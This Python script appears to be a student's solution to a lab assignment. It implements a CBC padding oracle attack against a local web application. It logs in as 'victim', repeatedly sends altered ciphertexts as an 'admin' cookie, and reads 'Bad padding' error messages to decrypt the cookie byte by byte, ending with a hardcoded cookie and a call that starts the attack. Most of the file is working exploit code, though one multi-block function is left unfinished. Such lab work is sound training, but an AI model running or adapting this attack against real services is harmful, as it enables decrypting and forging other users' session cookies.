import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from requests import codes, Session
import base64
import binascii


LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"
all_ones = "11111111111111111111111111111111"

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = 16
        self._sess = None

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        if self._sess is None:
            self._sess = Session()
            login_response = self.do_login_form("victim", "victim")
            if  login_response == False:
                raise("Could not login Exception")
        self._sess.cookies.set("admin", None)
        self._sess.cookies.set("admin", ct)
        data_dict = {"username":"victim",\
            "amount":str(1),\
            }
        response = self._sess.post(self.url, data_dict)
        if "Bad padding" in response.content.decode("utf-8") :
            return True
        return False        

    def do_login_form(self, username, password):
        data_dict = {"username":username,\
                "password":password,\
                "login":"Login"
                }
        response = self._sess.post(LOGIN_FORM_URL,data_dict)
        return response.status_code == codes.ok

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 4*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length*2))
    c0, c1 = convert_string_to_hex(c0), convert_string_to_hex(c1)
    print("Trying to dectrypt the two blocks:", c0, c1)
    result = list()
    flag = True
    for j in range(1, 17):
        byte_found = False
        byte = str()
        for i in range (0, 256):
            pad = get_pad(j, po.block_length*2)
            x = str(hex(i)[2:])
            y = x.rjust(2, '0') + ''.join(reversed(result))
            y = y.rjust(po.block_length*2, '0') 
            new_c0 = hex(int(c0, 16)^ int(pad, 16))
            new_c0 = hex(int(new_c0, 16)^ int(y, 16))[2:]
            new_c0 = new_c0.rjust(po.block_length*2, '0')
            if j == 16:
                new_c0 = all_ones+new_c0
            if not po.test_ciphertext(new_c0 + str(c1)):
                if new_c0 == c0 and flag==True:
                    print("Sent the same c, redo", y, x, i)
                    flag = False
                else:
                    result.append(hex(i)[2:].rjust(2, '0'))
                    if len(result)!= j:
                        raise Exception("Exception! one or more bytes could not be decrypted reached byte number", i)
                    print(result)
                    break
    msg = ''.join(reversed(result))
    print(msg)
    try:
        print(bytearray.fromhex(msg).decode())
    except:
        print("Decode error")
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)


def do_setcoins_form(sess,uname, coins):
    data_dict = {"username":uname,\
            "amount":str(coins),\
            }
    response = sess.post("http://localhost:8080/setcoins", data_dict)
    return response.status_code == codes.ok

def do_attack(cookie):
    po = PaddingOracle("http://localhost:8080/setcoins")
    block_list = list(split_into_blocks(cookie, int(po.block_length*2)))
    for i in range(1, len(block_list)):
        two_blocks = ''.join(block_list[i-1:i+1])
        po_attack_2blocks(po, two_blocks)


def convert_string_to_hex(cookie):
    return hex(int(cookie, 16))[2:]

def get_pad(num, block_length):
    result = str()
    for i in range(num):
        result += hex((num))[2:].rjust(2, '0')
    return result.rjust(block_length, '0') 


cookie = convert_string_to_hex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
do_attack(cookie)

    
